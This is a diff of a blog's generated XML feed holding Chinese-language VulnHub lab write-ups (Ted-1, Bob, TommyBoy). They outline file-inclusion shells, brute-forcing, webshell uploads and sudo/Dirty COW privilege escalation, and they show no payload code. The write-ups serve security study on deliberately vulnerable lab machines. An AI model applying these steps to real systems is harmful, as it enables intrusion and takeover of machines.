+        <content type="html"><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p></blockquote><span id="more"></span><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol><li>http进去时登录验证界面</li><li>用户名密码都好猜的要死，但是密码正确后要提示转成hash，使出来时sha256:英文字母大写</li><li>进去后是一个文件包含的页面</li><li>通过session注入的方式注入一句话反弹shell，然后再包含，得到shell</li><li>session注入方式，是注入user_pref键，注入内容需全部转成urlencode形式</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li>sudo -l 发现能以root权限无密码执行apt-get命令，以此提权</li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p><a href="https://tool.oschina.net/encrypt?type=2">https://tool.oschina.net/encrypt?type=2</a> hash加密<br><a href="https://www.iamwawa.cn/daxiaoxie.html">https://www.iamwawa.cn/daxiaoxie.html</a> 英文大小写转换</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络<br><img src="/2023/12/17/old/Ted-1-writeup/1%E7%BD%91%E7%BB%9C.png"><br>查看web页面<br><img src="/2023/12/17/old/Ted-1-writeup/11%E4%B8%BB%E9%A1%B5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/12%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2.png"><br>制作字典并爆破<br><img src="/2023/12/17/old/Ted-1-writeup/13%E5%AD%97%E5%85%B8.png"><br><img src="/2023/12/17/old/Ted-1-writeup/14.png"><br><img src="/2023/12/17/old/Ted-1-writeup/15.png"><br><img src="/2023/12/17/old/Ted-1-writeup/16%E6%88%90%E5%8A%9F.png"><br>撕开口子拿shell<br><img src="/2023/12/17/old/Ted-1-writeup/17session%E6%B3%A8%E5%85%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/18fantanshell%E8%AF%AD%E5%8F%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/19%E6%8B%BF%E5%88%B0shell.png"><br>提权<br><img src="/2023/12/17/old/Ted-1-writeup/20%E6%8F%90%E6%9D%83.png"></p><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>靶机真短</li><li>不过session注入是一个非常好的思路</li><li>user_pref什么的，还有sudo-l只执行apt-get太刻意了</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校资料<br><a href="https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a> session路径参考<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 提权方式参考</p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bob_writeup</title>
-    <url>/2023/12/11/old/bob_writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>名称: Bob: 1.0.1<br>作者：<a href="https://www.vulnhub.com/author/c0rruptedb1t,578/">c0rruptedb1t</a><br>靶机链接1:<a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a><br>靶机链接2:<a href="http://c0rruptedb1t.com/vms/bob.html">http://c0rruptedb1t.com/vms/bob.html</a><br>Your Goal is to get the flag in &#x2F;</p>
-</blockquote>
-<p>Hints: Remember to look for hidden info&#x2F;files </p>
-<span id="more"></span>
-
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>robots.txt泄露靶机的自带命令执行webshell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>找到bob家目录下的敏感文件 和 其Document目录下的一堆敏感文件</li>
-<li>根据文件信息得到jc用户的登录口令和一个加密文件及其密码(密码放在藏头诗里面)</li>
-<li>根据加密文件得到bob用户的登录口令</li>
-<li>bob用户被委派了所有的sudo权限，固能直接切换为root，也能直接查看flag</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><ul>
-<li>GnuPG 最流行的数据加密,数字签名工具软件</li>
-<li>GPG加密的具体步骤</li>
-</ul>
-<ol>
-<li>创建密钥(公钥,私钥)</li>
-<li>公钥用来加密数据,共享给其他人,通过导出公钥实现</li>
-<li>其他人导入公钥,并加密信息发给私钥拥有者</li>
-<li>私钥解密,查看文档</li>
-</ol>
-<p>其遵循OpenPGP标准，由RFC 4880定义</p>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/11/old/bob_writeup/20.png"><br>命令执行漏洞<br><img src="/2023/12/11/old/bob_writeup/45.png"><br>反弹shell<br><img src="/2023/12/11/old/bob_writeup/55.png"><br>在bob家目录发现old_passwordfile<br><img src="/2023/12/11/old/bob_writeup/66.png"><br><img src="/2023/12/11/old/bob_writeup/1.png"><br>登陆jc用户<br><img src="/2023/12/11/old/bob_writeup/2.png"><br>查看bob Secret目录下的内容<br><img src="/2023/12/11/old/bob_writeup/3.png"><br>查看notes.sh内容<br><img src="/2023/12/11/old/bob_writeup/4.png"><br>藏头诗密码解密密文<br><img src="/2023/12/11/old/bob_writeup/5.png"><br>密文内容<br><img src="/2023/12/11/old/bob_writeup/6.png"><br>登陆bob<br><img src="/2023/12/11/old/bob_writeup/7.png"><br>提权，sudo的可用权限大的很<br><img src="/2023/12/11/old/bob_writeup/8.png"><br><img src="/2023/12/11/old/bob_writeup/9.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>靶机唯二的难点在于找文件和看藏头诗，都是凭借经验和脑洞灵感之类的东西</li>
-<li>gpg加密这门技术对我来说比较新鲜</li>
-<li>像什么藏头诗、字谜什么的内容可以尝试玩一玩练一练</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的资料<br><a href="https://www.gnupg.org/">https://www.gnupg.org/</a><br><a href="https://www.openpgp.org/">https://www.openpgp.org/</a></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bob_writeup</title>
+      <link href="/2023/12/11/old/bob_writeup/"/>
+      <url>/2023/12/11/old/bob_writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>名称: Bob: 1.0.1<br>作者：<a href="https://www.vulnhub.com/author/c0rruptedb1t,578/">c0rruptedb1t</a><br>靶机链接1:<a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a><br>靶机链接2:<a href="http://c0rruptedb1t.com/vms/bob.html">http://c0rruptedb1t.com/vms/bob.html</a><br>Your Goal is to get the flag in &#x2F;</p></blockquote><p>Hints: Remember to look for hidden info&#x2F;files </p><span id="more"></span><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol><li>robots.txt泄露靶机的自带命令执行webshell</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li>找到bob家目录下的敏感文件 和 其Document目录下的一堆敏感文件</li><li>根据文件信息得到jc用户的登录口令和一个加密文件及其密码(密码放在藏头诗里面)</li><li>根据加密文件得到bob用户的登录口令</li><li>bob用户被委派了所有的sudo权限，固能直接切换为root，也能直接查看flag</li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><ul><li>GnuPG 最流行的数据加密,数字签名工具软件</li><li>GPG加密的具体步骤</li></ul><ol><li>创建密钥(公钥,私钥)</li><li>公钥用来加密数据,共享给其他人,通过导出公钥实现</li><li>其他人导入公钥,并加密信息发给私钥拥有者</li><li>私钥解密,查看文档</li></ol><p>其遵循OpenPGP标准，由RFC 4880定义</p><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/11/old/bob_writeup/20.png"><br>命令执行漏洞<br><img src="/2023/12/11/old/bob_writeup/45.png"><br>反弹shell<br><img src="/2023/12/11/old/bob_writeup/55.png"><br>在bob家目录发现old_passwordfile<br><img src="/2023/12/11/old/bob_writeup/66.png"><br><img src="/2023/12/11/old/bob_writeup/1.png"><br>登陆jc用户<br><img src="/2023/12/11/old/bob_writeup/2.png"><br>查看bob Secret目录下的内容<br><img src="/2023/12/11/old/bob_writeup/3.png"><br>查看notes.sh内容<br><img src="/2023/12/11/old/bob_writeup/4.png"><br>藏头诗密码解密密文<br><img src="/2023/12/11/old/bob_writeup/5.png"><br>密文内容<br><img src="/2023/12/11/old/bob_writeup/6.png"><br>登陆bob<br><img src="/2023/12/11/old/bob_writeup/7.png"><br>提权，sudo的可用权限大的很<br><img src="/2023/12/11/old/bob_writeup/8.png"><br><img src="/2023/12/11/old/bob_writeup/9.png"></p><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>靶机唯二的难点在于找文件和看藏头诗，都是凭借经验和脑洞灵感之类的东西</li><li>gpg加密这门技术对我来说比较新鲜</li><li>像什么藏头诗、字谜什么的内容可以尝试玩一玩练一练</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校给的资料<br><a href="https://www.gnupg.org/">https://www.gnupg.org/</a><br><a href="https://www.openpgp.org/">https://www.openpgp.org/</a></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tommyboy-writeup</title>
-    <url>/2023/12/03/old/tommyboy-writeup/</url>
-    <content><![CDATA[<h1 id="tommyboy-writeup"><a href="#tommyboy-writeup" class="headerlink" title="tommyboy_writeup"></a>tommyboy_writeup</h1><p>这是学校作业</p>
-<span id="more"></span>
-<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机名：tommyboy 1<br>靶机作者：<a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a><br>靶机链接1：<a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>靶机链接2:<a href="http://7ms.us/tommyboy">http://7ms.us/tommyboy</a><br>目标：5个flag和一个final message</p>
-</blockquote>
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><ol>
-<li>通过robots.txt泄露发现flag1</li>
-</ol>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><ol>
-<li>根据首页源码提示，得到提示链接，知道网站主目录</li>
-<li>浏览主目录的posts，发现一篇post的回复包含了flag2存放在什么文件的信息</li>
-</ol>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><ol>
-<li>根据主目录post回复中的提示，了解了一个存放图片的网站目录</li>
-<li>下载图片，用strings查看，发现了一串密文(一般有一定规律性，让人觉得很规整但看不懂的就是密文)</li>
-<li>通过在线md5工具解密该密文，得到一个单词</li>
-<li>用该单词作为网站主目录第二篇post的密码，成功访问该post内容</li>
-<li>根据该post提示，了解了靶机有一诡异的ftp服务，通过nmap不断扫描，直到发现多处来一个开放端口</li>
-<li>通过hydra爆破该服务密码，用户名根据post提示已经知道(记得将用户名添加到字典的第一行)</li>
-<li>爆破成功后登入ftp服务</li>
-<li>得到提示文本，发现一新目录，但是没讲具体位置，最后在8008端口的web服务上访问到该目录</li>
-<li>访问目录的回显提示，只有他和steve jobs可以访问其中的内容，通过脑洞猜测，试出来修改UA为iphone就能访问内容(脑洞什么根本没有的，只有抄的份)</li>
-<li>提示需要猜测网站正确的网页名，通过爆破得到网页名，我用的dirbuster(爆破不了一点，100线程就崩了，所以还是抄的)</li>
-<li>访问到网站网页，得到flag3和一hint，同时还有一个加密文件</li>
-</ol>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><ol>
-<li>根据hint中的提示，生成密码字典，我用的crunch</li>
-<li>用fcrackzip爆破成功得到3对用户名和密码，以及一个没有密码的用户名(错的)(前两对密码p用没有，第三对据hint是server的用户名和密码)</li>
-<li>通过wpscan扫描网站的用户</li>
-<li>对tom用户进行密码爆破，字典是rockyou，用wpscan爆破</li>
-<li>访问网站后台，在draft中得到密码提示，与hint中的第三对用户名密码拼接，通过ssh成功得到靶机shell</li>
-<li>ls发现了flag4</li>
-</ol>
-<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ol>
-<li>根据提示，在靶机根目录发.5.txt</li>
-<li>由于5.txt需要www-data权限，需要通过webshell来获得该权限，所以在&#x2F;var目录下查找网站根目录(由于有两个http端口，所以有两个根目录)</li>
-<li>发现可以在&#x2F;var&#x2F;thatsg0nnaleaveamark&#x2F;NickIzL33t&#x2F;P4TCH_4D4MS&#x2F;uploads写入webshell</li>
-<li>写入一句话木马，通过浏览器直接访问，用该webshell查看.5.txt内容</li>
-<li>拼接5个flag，解压loot.zip，通关该靶场</li>
-</ol>
-<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><ol>
-<li>上传linpeas脚本探测，得知多种提权方式</li>
-<li>使用脏牛脚本提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>robots.txt文件泄露<br>strings解插入隐写<br>hackbar修改User-agent<br>dirbuster网页名爆破<br>crunch密码生成器<br>fcrackzip zip密码爆破工具<br>wpscan(wordpress cms框架扫描器)扫描后台用户名和密码爆破<br>通过webshell获取www-data权限<br>linpeas linux提权漏洞扫描脚本<br>脏牛提权</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/03/old/tommyboy-writeup/11%E7%BD%91%E7%BB%9C%E6%83%85%E5%86%B5.png"><br>robots.txt文件泄露发现的flag1<br><img src="/2023/12/03/old/tommyboy-writeup/12flag1.png"><br>首页源码提示<br><img src="/2023/12/03/old/tommyboy-writeup/13%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA1.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/14%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/15%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E7%BF%BB%E8%AF%91.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/16%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E6%8C%87%E5%90%91%E9%93%BE%E6%8E%A5.png"><br>最终找到了网站主目录<br><img src="/2023/12/03/old/tommyboy-writeup/17%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%811.png"><br>发现新的网站目录<br><img src="/2023/12/03/old/tommyboy-writeup/18%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%812.png"><br>发现flag2<br><img src="/2023/12/03/old/tommyboy-writeup/19flag2.png"><br>发现图片，发现插入隐写<br><img src="/2023/12/03/old/tommyboy-writeup/21.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/22.png"><br>得到密码，解锁并查看第二篇post<br><img src="/2023/12/03/old/tommyboy-writeup/23.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/24%E5%85%A8%E6%96%87.png"><br>发现神必ftp端口<br><img src="/2023/12/03/old/tommyboy-writeup/25ftp%E7%AB%AF%E5%8F%A3.png"></p>
-<p>爆破ftp账号</p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/27%E5%B0%86%E7%94%A8%E6%88%B7%E5%90%8D%E6%94%BE%E5%9C%A8%E5%AD%97%E5%85%B8%E5%89%8D%E9%9D%A2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/28%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"><br>发现ftp服务存放的提示文本<br><img src="/2023/12/03/old/tommyboy-writeup/26%E4%B8%8B%E8%BD%BDreadme.png"><br><img src="/2023/12/03/old/tommyboy-writeup/29%E5%BE%97%E5%88%B0%E6%96%B0%E7%9B%AE%E5%BD%95.png"><br>发现8008网站的目录，根据提示修改UA，并爆破网页名<br><img src="/2023/12/03/old/tommyboy-writeup/31%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9B%AE%E5%BD%95.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/32%E6%9B%B4%E6%94%B9useragent%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/33%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B41.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/34%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B42.png"><br>得到flag3和hint<br><img src="/2023/12/03/old/tommyboy-writeup/35flag3+hint.png"><br>爆破backups密码<br><img src="/2023/12/03/old/tommyboy-writeup/36%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/37tommyboy%E4%B8%8A%E7%BA%BF%E6%97%B6%E9%97%B4.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/38%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/39%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/41%E8%A7%A3%E5%8E%8B.png"><br>得到提示<br><img src="/2023/12/03/old/tommyboy-writeup/42%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>wpscan扫描爆破网站后台<br><img src="/2023/12/03/old/tommyboy-writeup/43%E9%80%9A%E8%BF%87wpscan%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/44%E7%88%86%E7%A0%B4%E5%87%BA%E5%AF%86%E7%A0%81.png"><br>登陆后台查看draft<br><img src="/2023/12/03/old/tommyboy-writeup/45%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/46%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%8F%90%E7%A4%BA.png"><br>根据hint和draft提示，ssh连接靶机<br><img src="/2023/12/03/old/tommyboy-writeup/47ssh%E7%99%BB%E9%99%86.png"><br>查看flag4<br><img src="/2023/12/03/old/tommyboy-writeup/48flag4+%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>找到flag5<br><img src="/2023/12/03/old/tommyboy-writeup/49%E5%8F%91%E7%8E%B0flag5.png"><br>写webshell，获得www-data权限<br><img src="/2023/12/03/old/tommyboy-writeup/50%E5%88%B6%E4%BD%9Cwebshell.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/51%E9%80%9A%E8%BF%87webshell%E8%AF%BB%E5%8F%96flag5.png"><br>提权<br><img src="/2023/12/03/old/tommyboy-writeup/52%E9%80%9A%E8%BF%87linspea%E8%84%9A%E6%9C%AC%E6%8E%A2%E6%B5%8B%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/53%E8%8E%B7%E5%8F%9640616.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/54%E6%8F%90%E6%9D%83.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/55theend.png"><br>flag2和3<br><img src="/2023/12/03/old/tommyboy-writeup/flag2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/flag3.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC%E6%B1%87%E6%80%BB.txt"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>dirbuster以前没用过，不过图形化什么的确实挺方便</li>
-<li>linpeas这个脚本，功能十分强大</li>
-<li>脑洞不够，鬼知道stevejobs要改iphone，不过我想，可以讲所有苹果产品的UA搜集起来做成字典，用burpsuite爆破</li>
-<li>这个靶机，getroot是非必要的</li>
-<li>脏牛提权后不久，靶机就会死机，不知道其他提权方法会不会这样</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的ppt<br><a href="https://www.cnblogs.com/cute/p/16331359.html">https://www.cnblogs.com/cute/p/16331359.html</a> linpeas脚本介绍<br><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a> linpeas github库<br><a href="https://www.exploit-db.com/exploits/40616">https://www.exploit-db.com/exploits/40616</a> 脏牛提权exp脚本</p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tommyboy-writeup</title>
+      <link href="/2023/12/03/old/tommyboy-writeup/"/>
+      <url>/2023/12/03/old/tommyboy-writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="tommyboy-writeup"><a href="#tommyboy-writeup" class="headerlink" title="tommyboy_writeup"></a>tommyboy_writeup</h1><p>这是学校作业</p><span id="more"></span><h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机名：tommyboy 1<br>靶机作者：<a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a><br>靶机链接1：<a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>靶机链接2:<a href="http://7ms.us/tommyboy">http://7ms.us/tommyboy</a><br>目标：5个flag和一个final message</p></blockquote><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><ol><li>通过robots.txt泄露发现flag1</li></ol><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><ol><li>根据首页源码提示，得到提示链接，知道网站主目录</li><li>浏览主目录的posts，发现一篇post的回复包含了flag2存放在什么文件的信息</li></ol><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><ol><li>根据主目录post回复中的提示，了解了一个存放图片的网站目录</li><li>下载图片，用strings查看，发现了一串密文(一般有一定规律性，让人觉得很规整但看不懂的就是密文)</li><li>通过在线md5工具解密该密文，得到一个单词</li><li>用该单词作为网站主目录第二篇post的密码，成功访问该post内容</li><li>根据该post提示，了解了靶机有一诡异的ftp服务，通过nmap不断扫描，直到发现多处来一个开放端口</li><li>通过hydra爆破该服务密码，用户名根据post提示已经知道(记得将用户名添加到字典的第一行)</li><li>爆破成功后登入ftp服务</li><li>得到提示文本，发现一新目录，但是没讲具体位置，最后在8008端口的web服务上访问到该目录</li><li>访问目录的回显提示，只有他和steve jobs可以访问其中的内容，通过脑洞猜测，试出来修改UA为iphone就能访问内容(脑洞什么根本没有的，只有抄的份)</li><li>提示需要猜测网站正确的网页名，通过爆破得到网页名，我用的dirbuster(爆破不了一点，100线程就崩了，所以还是抄的)</li><li>访问到网站网页，得到flag3和一hint，同时还有一个加密文件</li></ol><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><ol><li>根据hint中的提示，生成密码字典，我用的crunch</li><li>用fcrackzip爆破成功得到3对用户名和密码，以及一个没有密码的用户名(错的)(前两对密码p用没有，第三对据hint是server的用户名和密码)</li><li>通过wpscan扫描网站的用户</li><li>对tom用户进行密码爆破，字典是rockyou，用wpscan爆破</li><li>访问网站后台，在draft中得到密码提示，与hint中的第三对用户名密码拼接，通过ssh成功得到靶机shell</li><li>ls发现了flag4</li></ol><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ol><li>根据提示，在靶机根目录发.5.txt</li><li>由于5.txt需要www-data权限，需要通过webshell来获得该权限，所以在&#x2F;var目录下查找网站根目录(由于有两个http端口，所以有两个根目录)</li><li>发现可以在&#x2F;var&#x2F;thatsg0nnaleaveamark&#x2F;NickIzL33t&#x2F;P4TCH_4D4MS&#x2F;uploads写入webshell</li><li>写入一句话木马，通过浏览器直接访问，用该webshell查看.5.txt内容</li><li>拼接5个flag，解压loot.zip，通关该靶场</li></ol><h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><ol><li>上传linpeas脚本探测，得知多种提权方式</li><li>使用脏牛脚本提权</li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p>robots.txt文件泄露<br>strings解插入隐写<br>hackbar修改User-agent<br>dirbuster网页名爆破<br>crunch密码生成器<br>fcrackzip zip密码爆破工具<br>wpscan(wordpress cms框架扫描器)扫描后台用户名和密码爆破<br>通过webshell获取www-data权限<br>linpeas linux提权漏洞扫描脚本<br>脏牛提权</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/03/old/tommyboy-writeup/11%E7%BD%91%E7%BB%9C%E6%83%85%E5%86%B5.png"><br>robots.txt文件泄露发现的flag1<br><img src="/2023/12/03/old/tommyboy-writeup/12flag1.png"><br>首页源码提示<br><img src="/2023/12/03/old/tommyboy-writeup/13%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA1.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/14%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA2.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/15%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E7%BF%BB%E8%AF%91.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/16%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E6%8C%87%E5%90%91%E9%93%BE%E6%8E%A5.png"><br>最终找到了网站主目录<br><img src="/2023/12/03/old/tommyboy-writeup/17%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%811.png"><br>发现新的网站目录<br><img src="/2023/12/03/old/tommyboy-writeup/18%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%812.png"><br>发现flag2<br><img src="/2023/12/03/old/tommyboy-writeup/19flag2.png"><br>发现图片，发现插入隐写<br><img src="/2023/12/03/old/tommyboy-writeup/21.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/22.png"><br>得到密码，解锁并查看第二篇post<br><img src="/2023/12/03/old/tommyboy-writeup/23.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/24%E5%85%A8%E6%96%87.png"><br>发现神必ftp端口<br><img src="/2023/12/03/old/tommyboy-writeup/25ftp%E7%AB%AF%E5%8F%A3.png"></p><p>爆破ftp账号</p><p><img src="/2023/12/03/old/tommyboy-writeup/27%E5%B0%86%E7%94%A8%E6%88%B7%E5%90%8D%E6%94%BE%E5%9C%A8%E5%AD%97%E5%85%B8%E5%89%8D%E9%9D%A2.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/28%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"><br>发现ftp服务存放的提示文本<br><img 